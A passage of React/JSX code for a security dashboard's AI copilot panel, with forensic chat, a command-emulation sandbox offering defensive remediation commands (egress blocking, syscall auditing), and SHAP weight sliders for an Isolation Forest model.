                onClick={() => setActiveCopilotTab("chat")}
                className={`flex-1 text-[10px] font-mono font-bold py-1 rounded text-center cursor-pointer transition-colors ${
                  activeCopilotTab === "chat"
                    ? "bg-purple-500/10 text-purple-400 border border-purple-500/20"
                    : "text-gray-500 hover:text-gray-300"
                }`}
              >
                Forensic chat
              </button>
              <button
                onClick={() => setActiveCopilotTab("sandbox")}
                className={`flex-1 text-[10px] font-mono font-bold py-1 rounded text-center cursor-pointer transition-colors ${
                  activeCopilotTab === "sandbox"
                    ? "bg-purple-500/10 text-purple-400 border border-purple-500/20"
                    : "text-gray-500 hover:text-gray-300"
                }`}
              >
                Code sandbox
              </button>
              <button
                onClick={() => setActiveCopilotTab("weights")}
                className={`flex-1 text-[10px] font-mono font-bold py-1 rounded text-center cursor-pointer transition-colors ${
                  activeCopilotTab === "weights"
                    ? "bg-purple-500/10 text-purple-400 border border-purple-500/20"
                    : "text-gray-500 hover:text-gray-300"
                }`}
              >
                SHAP estimators
              </button>
            </div>
          </div>

          {/* Tab contents (Render scrollable body) */}
          <div className="flex-1 overflow-y-auto p-4 space-y-4 scrollbar-thin min-h-0">
            <AnimatePresence mode="wait">
              {activeCopilotTab === "chat" && (
                <motion.div
                  key="chat-tab"
                  initial={{ opacity: 0, y: 5 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0 }}
                  className="space-y-4"
                >
                  {chatMessages.map((msg, index) => (
                    <div
                      key={index}
                      className={`flex flex-col ${msg.sender === "user" ? "items-end" : "items-start"}`}
                    >
                      <span className="text-[9px] font-mono text-gray-500 mb-1 px-1">
                        {msg.sender === "ai" ? "🤖 Vector copilot" : "👤 Analyst user"} • {msg.time}
                      </span>
                      <div
                        className={`max-w-[95%] rounded-xl px-3 py-2 text-xs font-sans leading-relaxed border ${
                          msg.sender === "user"
                            ? "bg-blue-500/5 border-blue-500/20 text-gray-200"
                            : "bg-[#09090B] border-[#23262F]/60 text-gray-300 shadow-sm"
                        }`}
                      >
                        <div className="markdown-body">
                          <ReactMarkdown>{msg.text}</ReactMarkdown>
                        </div>
                      </div>
                    </div>
                  ))}

                  {isAiTyping && (
                    <div className="flex flex-col items-start">
                      <span className="text-[9px] font-mono text-gray-500 mb-1 px-1">
                        🤖 Vector copilot evaluating...
                      </span>
                      <div className="bg-[#09090B] border border-[#23262F] rounded-xl px-3 py-2 text-xs text-gray-500 flex items-center gap-2">
                        <span className="w-1.5 h-1.5 rounded-full bg-purple-400 animate-bounce" />
                        <span className="w-1.5 h-1.5 rounded-full bg-purple-400 animate-bounce delay-75" />
                        <span className="w-1.5 h-1.5 rounded-full bg-purple-400 animate-bounce delay-150" />
                      </div>
                    </div>
                  )}
                  <div ref={chatEndRef} />
                </motion.div>
              )}

              {activeCopilotTab === "sandbox" && (
                <motion.div
                  key="sandbox-tab"
                  initial={{ opacity: 0, y: 5 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0 }}
                  className="space-y-4 font-mono text-xs"
                >
                  <p className="text-gray-400 font-sans text-[11px] leading-relaxed">
                    🧪 Simulate raw shell attack scripts here in isolation. Vector will evaluate
                    command telemetry on container hosts.
                  </p>

                  <div className="space-y-2">
                    <label className="text-gray-300 text-[10px] font-bold">
                      Emulation command ingress
                    </label>
                    <textarea
                      value={sandboxCommand}
                      onChange={(e) => setSandboxCommand(e.target.value)}
                      className="w-full bg-[#09090B] border border-[#23262F] rounded-lg p-2 text-[11px] text-gray-200 focus:outline-none focus:border-purple-500 font-mono h-20 resize-none"
                    />
                  </div>

                  <button
                    onClick={runSandboxCommand}
                    disabled={isSandboxRunning || !sandboxCommand.trim()}
                    className="w-full bg-purple-600 hover:bg-purple-500 disabled:opacity-50 text-white font-mono text-[10px] font-bold py-2 rounded-lg cursor-pointer transition-colors shadow shadow-purple-500/20 flex items-center justify-center gap-2"
                  >
                    {isSandboxRunning ? (
                      <>
                        <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                        <span>Intercepting...</span>
                      </>
                    ) : (
                      <>
                        <Play className="w-3.5 h-3.5" />
                        <span>Run emulation in sandbox</span>
                      </>
                    )}
                  </button>

                  {/* Sandbox Run Log */}
                  {sandboxLogs.length > 0 && (
                    <div className="space-y-1.5">
                      <label className="text-[10px] font-bold text-gray-500">
                        Sandbox outflow screen
                      </label>
                      <div className="bg-black/40 border border-[#23262F] rounded-lg p-2 text-[10px] text-gray-300 space-y-1 max-h-48 overflow-y-auto scrollbar-thin">
                        {sandboxLogs.map((line, idx) => (
                          <div
                            key={idx}
                            className={
                              line.includes("[crit]")
                                ? "text-red-400"
                                : line.includes("[warn]")
                                  ? "text-yellow-400"
                                  : line.includes("$")
                                    ? "text-blue-400 font-bold"
                                    : "text-gray-400"
                            }
                          >
                            {line}
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Playbooks Section */}
                  <div className="pt-2 border-t border-[#23262F]/40 space-y-2.5">
                    <span className="text-[10px] font-bold text-gray-300 font-sans">
                      Recommended remediations
                    </span>

                    <div className="space-y-2">
                      <div className="p-4 bg-black/20 border border-[#23262F] rounded-lg hover:border-gray-500/20 transition-all flex justify-between items-start">
                        <div className="space-y-1">
                          <div className="text-[10px] font-bold text-gray-200">
                            Inject network policy block
                          </div>
                          <p className="text-[9px] text-gray-500 font-sans leading-tight">
                            Restrict outbound connection to {selectedAlert.details.ipAddress}
                          </p>
                        </div>
                        <button
                          onClick={() => {
                            setSandboxCommand(
                              `kubectl apply -f dv-block-egress-${selectedAlert.id.toLowerCase()}.yaml`
                            );
                            setActiveCopilotTab("sandbox");
                          }}
                          className="px-2 py-0.5 bg-purple-500/10 text-purple-400 hover:bg-purple-500/20 rounded scale-90 text-[9px]"
                        >
                          Load
                        </button>
                      </div>

                      <div className="p-4 bg-black/20 border border-[#23262F] rounded-lg hover:border-gray-500/20 transition-all flex justify-between items-start">
                        <div className="space-y-1">
                          <div className="text-[10px] font-bold text-gray-200">
                            Syscall audit filter
                          </div>
                          <p className="text-[9px] text-gray-500 font-sans leading-tight">
                            Generate custom sys_clone monitor rules
                          </p>
                        </div>
                        <button
                          onClick={() => {
                            setSandboxCommand(`auditctl -a always,exit -S clone -F pid=28410`);
                            setActiveCopilotTab("sandbox");
                          }}
                          className="px-2 py-0.5 bg-purple-500/10 text-purple-400 hover:bg-purple-500/20 rounded scale-90 text-[9px]"
                        >
                          Load
                        </button>
                      </div>
                    </div>
                  </div>
                </motion.div>
              )}

              {activeCopilotTab === "weights" && (
                <motion.div
                  key="weights-tab"
                  initial={{ opacity: 0, y: 5 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0 }}
                  className="space-y-4"
                >
                  <p className="text-gray-400 font-sans text-[11px] leading-relaxed">
                    ⚖️ Adjust parameters to simulate the dynamic influence vectors calculated by our
                    central Isolation Forest algorithm.
                  </p>

                  <div className="bg-[#09090B] border border-[#23262F]/80 rounded-xl p-4 space-y-4">
                    {selectedAlert.details.shapFactors?.map((f, i) => {
                      const curVal =
                        shapWeights[f.factor] !== undefined ? shapWeights[f.factor] : f.impact;
                      return (
                        <div key={i} className="space-y-2 font-mono">
                          <div className="flex items-center justify-between text-[11px]">
                            <span className="text-gray-400 truncate max-w-[200px]">{f.factor}</span>
                            <span className="text-purple-400 font-bold">
                              {(curVal * 100).toFixed(0)}%
                            </span>
                          </div>
                          <input
                            type="range"
                            min="0"
                            max="1"
                            step="0.05"
                            value={curVal}
                            onChange={(e) =>
                              handleWeightTweak(f.factor, parseFloat(e.target.value))
                            }
                            className="w-full accent-purple-500 bg-black h-1 rounded-full appearance-none"
                          />
                        </div>
                      );
                    })}
                  </div>

                  <div className="p-3 bg-blue-500/5 border border-blue-500/10 rounded-lg text-[10px] text-gray-400 leading-normal font-sans">
                    💡 **Recalculation:** Modifying these sliders dynamically generates log events
                    in our background buffer indicating forest contamination modifications.
                  </div>
                </motion.div>
              )}
            </AnimatePresence>
          </div>

          {/* Interactive Chat Input form pinned at the bottom of the column */}
          {activeCopilotTab === "chat" && (
            <form
              onSubmit={handleSendChat}
              className="p-3 bg-[#161A22]/20 border-t border-[#23262F] flex items-center gap-2 shrink-0"
            >
              <input
                type="text"
                value={chatInputValue}
                onChange={(e) => setChatInputValue(e.target.value)}
                placeholder="Ask Copilot (e.g. /isolate, explain log line, block egress)..."
                className="flex-1 bg-[#09090B] border border-[#23262F] hover:border-purple-500/40 focus:border-purple-500 focus:outline-none rounded-lg px-3 py-2 text-xs text-gray-100 font-mono placeholder-gray-600 transition-colors"
              />
              <button
                type="submit"
                className="p-2 bg-purple-600 hover:bg-purple-500 text-white rounded-lg cursor-pointer transition-colors shadow shadow-purple-500/20 shrink-0"
              >
                <Send className="w-3.5 h-3.5" />
              </button>
            </form>
          )}
        </div>
      </div>
    </div>
  );
}
